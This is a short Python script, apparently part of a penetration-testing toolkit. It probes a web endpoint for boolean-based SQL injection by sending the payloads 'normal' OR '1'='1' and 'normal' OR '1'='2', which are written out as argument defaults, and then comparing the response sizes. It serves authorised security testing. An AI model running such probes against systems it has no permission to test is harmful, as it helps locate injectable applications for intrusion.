#!/usr/bin/env python3
"""
SQLi differential check template.
"""

from __future__ import annotations

from security_common import build_session, parser_common, request


def main() -> None:
    parser = parser_common("SQLi differential template")
    parser.add_argument("--endpoint", default="/search")
    parser.add_argument("--param", default="q")
    parser.add_argument("--baseline", default="normal")
    parser.add_argument("--true-case", default="normal' OR '1'='1")
    parser.add_argument("--false-case", default="normal' OR '1'='2")
    args = parser.parse_args()

    session = build_session(args.proxy, args.verify, args.timeout)
    baseline = request(session, "GET", args.target, args.endpoint, params={ args.param: args.baseline })
    true_case = request(session, "GET", args.target, args.endpoint, params={ args.param: args.true_case })
    false_case = request(session, "GET", args.target, args.endpoint, params={ args.param: args.false_case })

    print(f"[i] baseline={len(baseline.text)} true={len(true_case.text)} false={len(false_case.text)}")
    if true_case.text != false_case.text:
      print("[+] Differential behavior observed")
    else:
      print("[-] No obvious differential")


if __name__ == "__main__":
    main()
